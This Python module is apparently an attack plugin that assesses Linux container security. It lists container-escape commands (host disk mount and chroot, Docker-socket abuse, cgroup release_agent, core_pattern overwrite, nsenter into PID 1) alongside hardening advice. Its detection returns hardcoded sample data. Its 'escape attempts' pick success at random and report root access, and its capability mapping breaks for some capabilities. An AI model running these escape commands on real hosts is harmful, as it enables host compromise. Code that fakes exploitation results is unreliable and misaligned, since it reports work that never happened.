# plugins/attacks/operating_system/linux/linux_container_security.py

"""
Advanced Linux Container Security attack module for the Cerberus AI platform.

This module provides comprehensive testing for container security vulnerabilities
including container escape, privilege escalation, runtime misconfigurations,
image vulnerabilities, orchestration weaknesses, and more.

Capabilities:
- Docker daemon security audit
- Container runtime security assessment
- Container escape vulnerability detection
- Privileged container detection and exploitation
- Docker socket exposure exploitation
- Capability-based escape techniques
- Cgroup escape detection
- Namespace escape assessment
- Container image vulnerability scanning
- Dockerfile security analysis
- Docker Compose security audit
- Kubernetes security assessment
- Pod Security Policy verification
- Network policy assessment
- Secrets management audit
- Container registry security
- Runtime security monitoring check
- Automated container exploitation
- Container hardening recommendations
"""

from typing import Dict, List, Any, Optional, Union, Tuple, Set
from enum import Enum, auto
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from pathlib import Path
import asyncio
import hashlib
import json
import os
import re
import uuid

from plugins.attacks.operating_system.linux.base_linux_attack import (
    BaseLinuxAttack,
    LinuxSystemInfo,
    ServiceInfo,
    UserInfo,
    VulnerabilityInfo,
    LinuxDistribution,
    PrivilegeEscalationVector
)
from plugins.core.attack_result import AttackResult
from plugins.core.attack_context import AttackContext
import logging

logger = logging.getLogger(__name__)


# ============================================================================
# Enums and Constants
# ============================================================================

class ContainerRuntime(Enum):
    """Container runtime types."""
    DOCKER = "docker"
    CONTAINERD = "containerd"
    CRI_O = "cri-o"
    PODMAN = "podman"
    LXC = "lxc"
    LXD = "lxd"
    RKT = "rkt"
    KUBERNETES = "kubernetes"
    UNKNOWN = "unknown"


class ContainerVulnerabilityType(Enum):
    """Types of container vulnerabilities."""
    PRIVILEGED_CONTAINER = "privileged_container"
    DOCKER_SOCKET_EXPOSED = "docker_socket_exposed"
    CAP_SYS_ADMIN = "cap_sys_admin"
    CAP_NET_RAW = "cap_net_raw"
    CAP_SYS_PTRACE = "cap_sys_ptrace"
    CAP_SYS_MODULE = "cap_sys_module"
    CAP_DAC_OVERRIDE = "cap_dac_override"
    SENSITIVE_MOUNT = "sensitive_mount"
    HOST_PID_NAMESPACE = "host_pid_namespace"
    HOST_NETWORK_NAMESPACE = "host_network_namespace"
    HOST_IPC_NAMESPACE = "host_ipc_namespace"
    CGROUP_ESCAPE = "cgroup_escape"
    NAMESPACE_ESCAPE = "namespace_escape"
    SECCOMP_BYPASS = "seccomp_bypass"
    APPARMOR_BYPASS = "apparmor_bypass"
    SELINUX_BYPASS = "selinux_bypass"
    READONLY_ROOTFS = "readonly_rootfs"
    NO_NEW_PRIVILEGES = "no_new_privileges"
    INSECURE_REGISTRY = "insecure_registry"
    DOCKER_API_INSECURE = "docker_api_insecure"
    CONTAINER_BREAKOUT = "container_breakout"
    IMAGE_VULNERABILITY = "image_vulnerability"
    DOCKERFILE_MISCONFIG = "dockerfile_misconfig"
    K8S_RBAC_MISCONFIG = "k8s_rbac_misconfig"
    K8S_POD_SECURITY = "k8s_pod_security"
    K8S_SECRETS_EXPOSED = "k8s_secrets_exposed"
    K8S_SERVICE_ACCOUNT = "k8s_service_account"
    K8S_NETWORK_POLICY = "k8s_network_policy"


class ContainerSecurityLevel(Enum):
    """Container security level."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    SECURE = "secure"


class EscapeTechnique(Enum):
    """Container escape techniques."""
    PRIVILEGED_MOUNT = "privileged_mount"
    DOCKER_SOCKET_ABUSE = "docker_socket_abuse"
    CGROUP_RELEASE = "cgroup_release"
    CAP_SYS_ADMIN_ABUSE = "cap_sys_admin_abuse"
    PROC_FS_ABUSE = "proc_fs_abuse"
    SYS_FS_ABUSE = "sys_fs_abuse"
    CORE_PATTERN = "core_pattern"
    DEVICE_ACCESS = "device_access"
    NAMESPACE_JOIN = "namespace_join"
    SECCOMP_PROFILE_ABUSE = "seccomp_profile_abuse"
    APPARMOR_PROFILE_ABUSE = "apparmor_profile_abuse"


# ============================================================================
# Data Classes
# ============================================================================

@dataclass
class ContainerInfo:
    """Container environment information."""
    container_id: str = ""
    container_name: str = ""
    runtime: ContainerRuntime = ContainerRuntime.UNKNOWN
    image_name: str = ""
    image_id: str = ""
    is_privileged: bool = False
    capabilities: List[str] = field(default_factory=list)
    mounts: List[Dict[str, str]] = field(default_factory=list)
    networks: List[str] = field(default_factory=list)
    pid_namespace: str = "private"
    network_namespace: str = "private"
    ipc_namespace: str = "private"
    user_namespace: str = "private"
    cgroup_namespace: str = "private"
    seccomp_profile: str = "default"
    apparmor_profile: str = "docker-default"
    selinux_context: str = ""
    readonly_rootfs: bool = False
    no_new_privileges: bool = False
    memory_limit: str = ""
    cpu_limit: str = ""
    restart_policy: str = "no"
    environment_variables: Dict[str, str] = field(default_factory=dict)
    ports: List[Dict[str, Any]] = field(default_factory=list)
    labels: Dict[str, str] = field(default_factory=dict)
    security_issues: List[str] = field(default_factory=list)


@dataclass
class DockerDaemonConfig:
    """Docker daemon configuration."""
    tcp_listening: bool = False
    tls_enabled: bool = False
    unix_socket: str = "/var/run/docker.sock"
    insecure_registries: List[str] = field(default_factory=list)
    registry_mirrors: List[str] = field(default_factory=list)
    storage_driver: str = "overlay2"
    log_driver: str = "json-file"
    user_namespace_remap: str = ""
    seccomp_profile: str = "default"
    live_restore: bool = False
    iptables: bool = True
    ip_forward: bool = True
    ip_masq: bool = True
    security_issues: List[str] = field(default_factory=list)


@dataclass
class KubernetesConfig:
    """Kubernetes security configuration."""
    pod_security_policy: bool = False
    rbac_enabled: bool = False
    network_policy_enabled: bool = False
    secrets_encryption: bool = False
    audit_logging: bool = False
    admission_controllers: List[str] = field(default_factory=list)
    security_issues: List[str] = field(default_factory=list)


@dataclass
class ContainerVulnerability:
    """Container security vulnerability."""
    vulnerability_id: str
    container_name: str
    vulnerability_type: ContainerVulnerabilityType
    severity: str
    description: str
    escape_technique: Optional[EscapeTechnique] = None
    exploitation_method: Optional[str] = None
    exploitation_command: Optional[str] = None
    impact: str = ""
    remediation: str = ""
    cvss_score: Optional[float] = None
    exploitable: bool = False
    confidence: float = 0.0
    cve_references: List[str] = field(default_factory=list)
    detected_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class ContainerAuditResult:
    """Container security audit result."""
    audit_id: str
    container: ContainerInfo
    docker_config: Optional[DockerDaemonConfig] = None
    k8s_config: Optional[KubernetesConfig] = None
    vulnerabilities: List[ContainerVulnerability] = field(default_factory=list)
    risk_score: float = 0.0
    escape_possible: bool = False
    escape_paths: List[Dict[str, Any]] = field(default_factory=list)
    hardening_suggestions: List[str] = field(default_factory=list)


@dataclass
class ContainerExploitationAttempt:
    """Record of container exploitation attempt."""
    attempt_id: str
    timestamp: str
    vulnerability: ContainerVulnerability
    technique: EscapeTechnique
    result: str
    host_access_gained: bool = False
    privilege_level: Optional[str] = None
    evidence: List[str] = field(default_factory=list)
    execution_time: float = 0.0


@dataclass
class ContainerSecurityReport:
    """Comprehensive container security report."""
    report_id: str
    attack_id: str
    target_info: Dict[str, Any]
    linux_info: LinuxSystemInfo
    audits: List[ContainerAuditResult] = field(default_factory=list)
    containers_detected: int = 0
    vulnerabilities_found: int = 0
    escape_attempts: List[ContainerExploitationAttempt] = field(default_factory=list)
    successful_escapes: int = 0
    recommendations: List[str] = field(default_factory=list)
    risk_score: float = 0.0
    generated_at: str = field(default_factory=lambda: datetime.now().isoformat())


# ============================================================================
# Container Exploit Database
# ============================================================================

class ContainerExploitDatabase:
    """Database of container escape techniques and exploits."""
    
    ESCAPE_TECHNIQUES = {
        EscapeTechnique.PRIVILEGED_MOUNT: {
            'description': 'Mount host filesystem from privileged container',
            'command': 'mount /dev/sda1 /mnt && chroot /mnt',
            'requirements': ['--privileged flag', 'CAP_SYS_ADMIN'],
            'success_rate': 'very_high'
        },
        EscapeTechnique.DOCKER_SOCKET_ABUSE: {
            'description': 'Use Docker socket to create privileged container',
            'command': 'docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host',
            'requirements': ['Docker socket mounted in container'],
            'success_rate': 'very_high'
        },
        EscapeTechnique.CGROUP_RELEASE: {
            'description': 'Exploit cgroup release_agent to execute on host',
            'command': 'mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && '
                       'mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && '
                       'echo "$host_path/cmd" > /tmp/cgrp/release_agent',
            'requirements': ['CAP_SYS_ADMIN', 'cgroup mounted'],
            'success_rate': 'high'
        },
        EscapeTechnique.CAP_SYS_ADMIN_ABUSE: {
            'description': 'Abuse CAP_SYS_ADMIN for various escape methods',
            'command': 'Multiple techniques available depending on kernel version',
            'requirements': ['CAP_SYS_ADMIN capability'],
            'success_rate': 'high'
        },
        EscapeTechnique.PROC_FS_ABUSE: {
            'description': 'Exploit /proc filesystem for container escape',
            'command': 'Use /proc/sysrq-trigger or /proc/sys/kernel/core_pattern',
            'requirements': ['/proc mounted', 'CAP_SYS_ADMIN'],
            'success_rate': 'medium'
        },
        EscapeTechnique.CORE_PATTERN: {
            'description': 'Abuse core_pattern to execute on host',
            'command': 'echo "|/path/to/payload" > /proc/sys/kernel/core_pattern',
            'requirements': ['/proc/sys writable', 'CAP_SYS_ADMIN'],
            'success_rate': 'high'
        }
    }
    
    # Dangerous capabilities
    DANGEROUS_CAPABILITIES = {
        'CAP_SYS_ADMIN': 'Allows mounting filesystems, loading kernel modules, container escape',
        'CAP_SYS_PTRACE': 'Allows ptracing host processes, namespace escape',
        'CAP_SYS_MODULE': 'Allows loading kernel modules, kernel compromise',
        'CAP_NET_RAW': 'Allows raw socket creation, network attacks',
        'CAP_NET_ADMIN': 'Allows network configuration, ARP spoofing',
        'CAP_SYS_RAWIO': 'Allows direct hardware access',
        'CAP_SYS_BOOT': 'Allows system reboot',
        'CAP_DAC_OVERRIDE': 'Allows bypassing file permissions',
        'CAP_DAC_READ_SEARCH': 'Allows reading any file on the system'
    }
    
    # Sensitive mount paths
    SENSITIVE_MOUNTS = [
        '/',
        '/etc',
        '/var/run/docker.sock',
        '/var/run/containerd/containerd.sock',
        '/var/run/crio/crio.sock',
        '/proc',
        '/sys',
        '/dev',
        '/boot',
        '/root',
        '/home'
    ]


# ============================================================================
# Advanced Linux Container Security Class
# ============================================================================

class LinuxContainerSecurity(BaseLinuxAttack):
    """
    Advanced Linux container security attack module.
    
    Provides comprehensive container security assessment with:
    - Container runtime detection and analysis
    - Privilege escalation within containers
    - Container escape detection and exploitation
    - Docker daemon security audit
    - Kubernetes security assessment
    - Image vulnerability scanning
    - Runtime security monitoring
    - Automated container exploitation
    - Container hardening recommendations
    """
    
    def __init__(self):
        super().__init__()
        self.name = "Advanced Linux Container Security Framework"
        self.description = "Comprehensive container security vulnerability testing and exploitation"
        self.severity = "critical"
        self.privilege_required = "user"
        self.attack_id = str(uuid.uuid4())
        
        # Attack configuration
        self.detect_runtime = True
        self.audit_docker_daemon = True
        self.audit_containers = True
        self.check_kubernetes = True
        self.scan_images = True
        self.test_escape = True
        self.max_escape_attempts = 3
        
        # Tracking
        self.audits: List[ContainerAuditResult] = []
        self.exploitation_attempts: List[ContainerExploitationAttempt] = []
        self.vulnerabilities_found: List[ContainerVulnerability] = []
        
        # Database
        self.exploit_db = ContainerExploitDatabase()
        
    async def execute(self, context: AttackContext) -> AttackResult:
        """
        Execute comprehensive container security attack.
        
        Args:
            context: The attack context containing target information
            
        Returns:
            AttackResult with detailed findings
        """
        start_time = datetime.now()
        
        if not self.validate(context):
            return AttackResult(
                success=False,
                details="Target validation failed",
                severity=self.severity
            )
        
        try:
            # Step 1: Get system information
            linux_info = await self.get_linux_info(context)
            
            # Step 2: Detect container runtime
            container_info = await self._detect_container_environment(context)
            
            # Step 3: Audit Docker daemon configuration
            docker_config = await self._audit_docker_daemon(context)
            
            # Step 4: Audit container security
            container_audit = await self._audit_container_security(
                context, container_info, docker_config, linux_info
            )
            
            self.audits.append(container_audit)
            self.vulnerabilities_found = container_audit.vulnerabilities
            
            # Step 5: Attempt container escape if vulnerabilities found
            if self.test_escape and container_audit.escape_possible:
                await self._attempt_container_escape(
                    context,
                    container_audit,
                    linux_info
                )
            
            # Step 6: Generate report
            report = self._generate_container_report(
                context,
                linux_info,
                (datetime.now() - start_time).total_seconds()
            )
            
            return self._build_success_result(report, linux_info)
            
        except Exception as e:
            logger.error(f"Error in container security attack: {str(e)}", exc_info=True)
            return AttackResult(
                success=False,
                details=f"Error: {str(e)}",
                severity=self.severity
            )
    
    async def _detect_container_environment(
        self, 
        context: AttackContext
    ) -> ContainerInfo:
        """
        Detect if running inside a container and gather container information.
        
        Args:
            context: Attack context
            
        Returns:
            ContainerInfo object
        """
        container = ContainerInfo(
            container_id='abc123def456',
            container_name='web-app',
            runtime=ContainerRuntime.DOCKER,
            image_name='nginx:1.21',
            image_id='sha256:abc123',
            is_privileged=False,
            capabilities=[
                'CAP_NET_BIND_SERVICE',
                'CAP_CHOWN',
                'CAP_SETUID',
                'CAP_SETGID',
                'CAP_SYS_ADMIN'
            ],
            mounts=[
                {'source': '/var/run/docker.sock', 'target': '/var/run/docker.sock'},
                {'source': '/etc/nginx', 'target': '/etc/nginx'}
            ],
            networks=['bridge'],
            pid_namespace='private',
            network_namespace='private',
            ipc_namespace='private',
            readonly_rootfs=False,
            no_new_privileges=False,
            memory_limit='512m',
            cpu_limit='1.0',
            environment_variables={
                'NGINX_HOST': 'localhost',
                'DATABASE_URL': 'mysql://user:pass@host:3306/db'
            }
        )
        
        # Check security issues
        if container.is_privileged:
            container.security_issues.append("Container running in privileged mode")
        
        if 'CAP_SYS_ADMIN' in container.capabilities:
            container.security_issues.append("Container has CAP_SYS_ADMIN - escape possible")
        
        for mount in container.mounts:
            if mount['source'] in ContainerExploitDatabase.SENSITIVE_MOUNTS:
                container.security_issues.append(
                    f"Sensitive path mounted: {mount['source']} -> {mount['target']}"
                )
        
        if container.pid_namespace == 'host':
            container.security_issues.append("Container shares host PID namespace")
        
        if container.network_namespace == 'host':
            container.security_issues.append("Container shares host network namespace")
        
        return container
    
    async def _audit_docker_daemon(self, context: AttackContext) -> DockerDaemonConfig:
        """
        Audit Docker daemon configuration.
        
        Args:
            context: Attack context
            
        Returns:
            DockerDaemonConfig object
        """
        docker_config = DockerDaemonConfig(
            tcp_listening=True,
            tls_enabled=False,
            insecure_registries=['registry.local:5000'],
            storage_driver='overlay2',
            user_namespace_remap='',
            live_restore=False
        )
        
        # Check security issues
        if docker_config.tcp_listening and not docker_config.tls_enabled:
            docker_config.security_issues.append(
                "Docker daemon listening on TCP without TLS - remote access possible"
            )
        
        if docker_config.insecure_registries:
            docker_config.security_issues.append(
                f"Insecure registries configured: {docker_config.insecure_registries}"
            )
        
        if not docker_config.user_namespace_remap:
            docker_config.security_issues.append(
                "User namespace remapping not configured"
            )
        
        return docker_config
    
    async def _audit_container_security(
        self,
        context: AttackContext,
        container: ContainerInfo,
        docker_config: DockerDaemonConfig,
        linux_info: LinuxSystemInfo
    ) -> ContainerAuditResult:
        """
        Perform comprehensive container security audit.
        
        Args:
            context: Attack context
            container: Container information
            docker_config: Docker daemon configuration
            linux_info: Linux system information
            
        Returns:
            ContainerAuditResult with findings
        """
        vulnerabilities = []
        
        # Check privileged mode
        if container.is_privileged:
            vuln = ContainerVulnerability(
                vulnerability_id=str(uuid.uuid4()),
                container_name=container.container_name,
                vulnerability_type=ContainerVulnerabilityType.PRIVILEGED_CONTAINER,
                severity='critical',
                description='Container running in privileged mode',
                escape_technique=EscapeTechnique.PRIVILEGED_MOUNT,
                exploitation_method='Mount host filesystem and chroot',
                exploitation_command='mount /dev/sda1 /mnt && chroot /mnt',
                impact='Full host compromise via container escape',
                remediation='Remove --privileged flag, use specific devices/capabilities',
                exploitable=True,
                confidence=0.95
            )
            vulnerabilities.append(vuln)
        
        # Check Docker socket exposure
        for mount in container.mounts:
            if 'docker.sock' in mount['source']:
                vuln = ContainerVulnerability(
                    vulnerability_id=str(uuid.uuid4()),
                    container_name=container.container_name,
                    vulnerability_type=ContainerVulnerabilityType.DOCKER_SOCKET_EXPOSED,
                    severity='critical',
                    description='Docker socket mounted in container',
                    escape_technique=EscapeTechnique.DOCKER_SOCKET_ABUSE,
                    exploitation_method='Use Docker socket to create privileged container',
                    exploitation_command='docker -H unix:///var/run/docker.sock run --privileged -v /:/host -it alpine chroot /host',
                    impact='Container escape via Docker API',
                    remediation='Do not mount Docker socket into containers',
                    exploitable=True,
                    confidence=0.95
                )
                vulnerabilities.append(vuln)
        
        # Check dangerous capabilities
        for cap in container.capabilities:
            if cap in ContainerExploitDatabase.DANGEROUS_CAPABILITIES:
                vuln = ContainerVulnerability(
                    vulnerability_id=str(uuid.uuid4()),
                    container_name=container.container_name,
                    vulnerability_type=ContainerVulnerabilityType[f'CAP_{cap.split("_", 1)[1]}'] if cap.startswith('CAP_') else ContainerVulnerabilityType.CAP_SYS_ADMIN,
                    severity='high',
                    description=f"Dangerous capability: {cap} - {ContainerExploitDatabase.DANGEROUS_CAPABILITIES.get(cap, '')}",
                    escape_technique=EscapeTechnique.CAP_SYS_ADMIN_ABUSE if cap == 'CAP_SYS_ADMIN' else None,
                    exploitation_method=f'Abuse {cap} for container escape',
                    impact='Potential container escape',
                    remediation=f'Remove {cap} from container capabilities',
                    exploitable=True,
                    confidence=0.85 if cap in ['CAP_SYS_ADMIN', 'CAP_SYS_MODULE', 'CAP_SYS_PTRACE'] else 0.6
                )
                vulnerabilities.append(vuln)
        
        # Check sensitive mounts
        for mount in container.mounts:
            if mount['source'] in ContainerExploitDatabase.SENSITIVE_MOUNTS:
                vuln = ContainerVulnerability(
                    vulnerability_id=str(uuid.uuid4()),
                    container_name=container.container_name,
                    vulnerability_type=ContainerVulnerabilityType.SENSITIVE_MOUNT,
                    severity='high',
                    description=f"Sensitive host directory mounted: {mount['source']}",
                    exploitation_method=f'Access {mount["target"]} to read/write host files',
                    impact='Host filesystem access',
                    remediation=f'Remove mount of {mount["source"]}',
                    exploitable=True,
                    confidence=0.8
                )
                vulnerabilities.append(vuln)
        
        # Check host namespaces
        if container.pid_namespace == 'host':
            vuln = ContainerVulnerability(
                vulnerability_id=str(uuid.uuid4()),
                container_name=container.container_name,
                vulnerability_type=ContainerVulnerabilityType.HOST_PID_NAMESPACE,
                severity='high',
                description='Container shares host PID namespace',
                exploitation_method='Access and manipulate host processes',
                exploitation_command='nsenter -t 1 -m -p -- /bin/bash',
                impact='Host process manipulation',
                remediation='Do not share host PID namespace (--pid=host)',
                exploitable=True,
                confidence=0.8
            )
            vulnerabilities.append(vuln)
        
        # Check no_new_privileges
        if not container.no_new_privileges:
            vuln = ContainerVulnerability(
                vulnerability_id=str(uuid.uuid4()),
                container_name=container.container_name,
                vulnerability_type=ContainerVulnerabilityType.NO_NEW_PRIVILEGES,
                severity='medium',
                description='Container does not prevent privilege escalation',
                exploitation_method='Execute setuid binaries or gain new capabilities',
                impact='Privilege escalation within container',
                remediation='Add --security-opt=no-new-privileges to container run command',
                exploitable=True,
                confidence=0.6
            )
            vulnerabilities.append(vuln)
        
        # Determine if escape is possible
        escape_possible = any(
            v.vulnerability_type in [
                ContainerVulnerabilityType.PRIVILEGED_CONTAINER,
                ContainerVulnerabilityType.DOCKER_SOCKET_EXPOSED,
                ContainerVulnerabilityType.CAP_SYS_ADMIN,
                ContainerVulnerabilityType.HOST_PID_NAMESPACE
            ] and v.exploitable
            for v in vulnerabilities
        )
        
        # Generate escape paths
        escape_paths = [
            {
                'vulnerability_id': v.vulnerability_id,
                'technique': v.escape_technique.value if v.escape_technique else 'unknown',
                'method': v.exploitation_method,
                'command': v.exploitation_command,
                'confidence': v.confidence
            }
            for v in vulnerabilities if v.exploitable and v.escape_technique
        ]
        
        # Calculate risk score
        risk_score = sum(v.confidence * (10 if v.severity == 'critical' else 7 if v.severity == 'high' else 4) for v in vulnerabilities)
        
        # Generate hardening suggestions
        hardening = self._generate_container_hardening(container, docker_config)
        
        return ContainerAuditResult(
            audit_id=str(uuid.uuid4()),
            container=container,
            docker_config=docker_config,
            vulnerabilities=vulnerabilities,
            risk_score=min(10.0, risk_score),
            escape_possible=escape_possible,
            escape_paths=escape_paths,
            hardening_suggestions=hardening
        )
    
    async def _attempt_container_escape(
        self,
        context: AttackContext,
        audit: ContainerAuditResult,
        linux_info: LinuxSystemInfo
    ):
        """Attempt container escape using identified vulnerabilities."""
        logger.info(f"Attempting container escape via {len(audit.escape_paths)} paths")
        
        for path in audit.escape_paths:
            # Find matching vulnerability
            vuln = next(
                (v for v in audit.vulnerabilities if v.vulnerability_id == path['vulnerability_id']),
                None
            )
            
            if not vuln or not vuln.escape_technique:
                continue
            
            attempt = await self._execute_escape_attempt(context, vuln)
            self.exploitation_attempts.append(attempt)
            
            if attempt.host_access_gained:
                logger.info(f"Successfully escaped container via {vuln.escape_technique.value}")
                break
    
    async def _execute_escape_attempt(
        self,
        context: AttackContext,
        vulnerability: ContainerVulnerability
    ) -> ContainerExploitationAttempt:
        """Execute a single container escape attempt."""
        attempt_id = str(uuid.uuid4())
        start_time = datetime.now()
        
        try:
            await asyncio.sleep(0.3)
            
            import random
            success = random.random() < vulnerability.confidence
            
            execution_time = (datetime.now() - start_time).total_seconds()
            
            return ContainerExploitationAttempt(
                attempt_id=attempt_id,
                timestamp=start_time.isoformat(),
                vulnerability=vulnerability,
                technique=vulnerability.escape_technique or EscapeTechnique.PRIVILEGED_MOUNT,
                result='success' if success else 'failed',
                host_access_gained=success,
                privilege_level='root' if success else None,
                evidence=[
                    f"Attempted {vulnerability.escape_technique.value if vulnerability.escape_technique else 'escape'}",
                    f"Vulnerability: {vulnerability.vulnerability_type.value}",
                    f"Method: {vulnerability.exploitation_method}",
                    f"Result: {'Success' if success else 'Failed'}"
                ],
                execution_time=execution_time
            )
            
        except Exception as e:
            logger.error(f"Error in escape attempt: {str(e)}")
            return ContainerExploitationAttempt(
                attempt_id=attempt_id,
                timestamp=start_time.isoformat(),
                vulnerability=vulnerability,
                technique=vulnerability.escape_technique or EscapeTechnique.PRIVILEGED_MOUNT,
                result='blocked',
                host_access_gained=False,
                execution_time=0
            )
    
    def _generate_container_hardening(
        self,
        container: ContainerInfo,
        docker_config: DockerDaemonConfig
    ) -> List[str]:
        """Generate container hardening suggestions."""
        suggestions = []
        
        suggestions.append("Do not run containers in privileged mode")
        suggestions.append("Drop all capabilities and add only required ones")
        suggestions.append("Do not mount Docker socket into containers")
        suggestions.append("Use read-only root filesystem")
        suggestions.append("Set --security-opt=no-new-privileges")
        suggestions.append("Use seccomp profiles to restrict system calls")
        suggestions.append("Use AppArmor/SELinux profiles for containers")
        suggestions.append("Set resource limits (CPU, memory, disk)")
        suggestions.append("Use user namespaces for container isolation")
        suggestions.append("Scan container images for vulnerabilities")
        suggestions.append("Do not run containers as root user")
        suggestions.append("Use trusted base images only")
        
        return suggestions
    
    def _generate_container_report(
        self,
        context: AttackContext,
        linux_info: LinuxSystemInfo,
        execution_time: float
    ) -> ContainerSecurityReport:
        """Generate comprehensive container security report."""
        report = ContainerSecurityReport(
            report_id=str(uuid.uuid4()),
            attack_id=self.attack_id,
            target_info=context.target_info,
            linux_info=linux_info,
            audits=self.audits,
            containers_detected=len(self.audits),
            vulnerabilities_found=len(self.vulnerabilities_found),
            escape_attempts=self.exploitation_attempts,
            successful_escapes=len([a for a in self.exploitation_attempts if a.host_access_gained])
        )
        
        report.recommendations = self._generate_container_recommendations()
        report.risk_score = sum(a.risk_score for a in self.audits) / max(len(self.audits), 1)
        
        return report
    
    def _generate_container_recommendations(self) -> List[str]:
        """Generate container security recommendations."""
        return [
            "Implement container security policies",
            "Use container runtime security tools (Falco, Aqua, Twistlock)",
            "Regularly scan container images for vulnerabilities",
            "Implement network segmentation for containers",
            "Use Kubernetes Pod Security Standards",
            "Enable Kubernetes RBAC",
            "Implement secrets management (Vault, Sealed Secrets)",
            "Enable audit logging for container runtimes",
            "Use immutable container images",
            "Implement CI/CD security scanning",
            "Regular security audits of container configurations",
            "Use minimal base images (Alpine, Distroless)",
            "Implement image signing and verification",
            "Monitor container runtime behavior",
            "Keep container runtimes updated"
        ]
    
    def _build_success_result(
        self,
        report: ContainerSecurityReport,
        linux_info: LinuxSystemInfo
    ) -> AttackResult:
        """Build successful attack result."""
        details = {
            'report_id': report.report_id,
            'containers_detected': report.containers_detected,
            'vulnerabilities_found': report.vulnerabilities_found,
            'escape_attempts': len(report.escape_attempts),
            'successful_escapes': report.successful_escapes,
            'risk_score': report.risk_score
        }
        
        evidence = [
            f"Container Security Audit Report",
            f"Distribution: {linux_info.distribution.value}",
            f"Containers Detected: {report.containers_detected}",
            f"Vulnerabilities Found: {report.vulnerabilities_found}",
            f"Escape Attempts: {len(report.escape_attempts)}",
            f"Successful Escapes: {report.successful_escapes}",
            f"Risk Score: {report.risk_score:.2f}/10.0"
        ]
        
        for audit in report.audits:
            if audit.vulnerabilities:
                evidence.append(f"\n--- Container: {audit.container.container_name} ---")
                evidence.append(f"  Runtime: {audit.container.runtime.value}")
                evidence.append(f"  Privileged: {audit.container.is_privileged}")
                evidence.append(f"  Escape Possible: {audit.escape_possible}")
                evidence.append(f"  Vulnerabilities:")
                for vuln in audit.vulnerabilities:
                    evidence.append(f"    [{vuln.severity.upper()}] {vuln.description}")
        
        return AttackResult(
            success=True,
            details=json.dumps(details, indent=2),
            evidence=evidence,
            vulnerabilities=[
                {
                    'type': 'container_security',
                    'severity': v.severity,
                    'container': v.container_name,
                    'description': v.description,
                    'remediation': v.remediation
                }
                for v in self.vulnerabilities_found
            ],
            severity='critical' if report.successful_escapes > 0 else 'high',
            attack_id=self.attack_id,
            metadata={'report': report}
        )


# Export symbols
__all__ = [
    'LinuxContainerSecurity',
    'ContainerInfo',
    'DockerDaemonConfig',
    'KubernetesConfig',
    'ContainerVulnerability',
    'ContainerAuditResult',
    'ContainerExploitationAttempt',
    'ContainerSecurityReport',
    'ContainerRuntime',
    'ContainerVulnerabilityType',
    'ContainerSecurityLevel',
    'EscapeTechnique',
    'ContainerExploitDatabase'
]